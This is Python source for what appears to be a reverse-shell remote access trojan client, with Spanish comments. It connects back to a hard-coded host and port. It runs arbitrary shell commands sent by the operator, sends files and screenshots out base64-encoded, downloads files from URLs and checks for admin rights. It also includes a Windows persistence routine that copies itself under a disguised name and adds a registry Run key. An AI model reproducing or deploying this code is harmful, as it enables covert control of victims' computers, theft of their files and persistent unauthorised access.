import socket
import os
import subprocess
import base64
import requests
import mss
import time
import shutil
import sys

def windows_persistence():
    location=os.environ['appdata']+'\\windows32.exe'
    if not os.path.exists(location):
        #se ejecuta la persistencia
        shutil.copyfile(sys.executable,location)
        subprocess.call('reg add HKCU \Software\Microsoft\Windows\CurrentVersion\Run /v system32 /t REG_SZ /d "'+location+'"',shell=True)


def check_root():
    global root
    try:
        check=os.listdir("/root") #poner la ruta de windows TEMP
    except:
        root="No admin privileges."
    else:
        root="You have admin privileges."
def connection():
    while True:
        print("Try to connect to server...exit")
        time.sleep(5)
        try:
            connect()
            shell()
        except:
            connection()

def take_screenshot():
    screen=mss()
    for filename in screen.save(output='monitor-1.png', screen=1):
        print(filename)

def download_file(url):
    consulta=requests.get(url)
    name_file = url.split("/")[-1]
    with open(name_file,"wb") as file_download:
        file_download.write(consulta.content)

def shell():
    current_dir=os.getcwd()
    client.send(current_dir)
    while True:
        res=client.recv(1024)
        if res=="exit":
            break
        elif res[:2]=="cd":
            try:
                os.chdir(res[3:])
                result = os.getcwd()
                client.send(result)
            except OSError:
                client.send("no existe directorio")
        elif res[:8]=="download":
            with open(res[9:],"rb") as file_download:
                client.send(base64.b64encode(file_download.read()))
        elif res[:6]=="upload":
            with open(res[7:],"wb") as file_upload:
                datos=client.recv(3000000)
                file_upload.write(base64.b64encode(datos))
        elif res[:3]=="get":
            try:
                download_file(res[4:])
                client.send("File download successfully.")
            except:
                client.send("Can not download file, verify the url.")
        elif res[:10]=="screenshot":
            try:
                take_screenshot()
                with open("monitor-1.png","rb") as file_send:
                    client.send(base64.b64encode(file_send.read()))
                os.remove("monitor-1.png")
            except:
                client.send(base64.b64encode("fail"))
        elif res[:5]=="check":
            try:
                check_root()
                client.send(root)
            except:
                client.send("Can not do the task.")
        else:
            proc=subprocess.Popen(res,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
            result=proc.stdout.read()+proc.stderr.read()
            client.send(result)

def connect():
    global client
    client=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    client.connect(("192.168.0.18",7777))



def main():
    #windows_persistence()
    connection()
    client.close()

if __name__ == '__main__':
    main()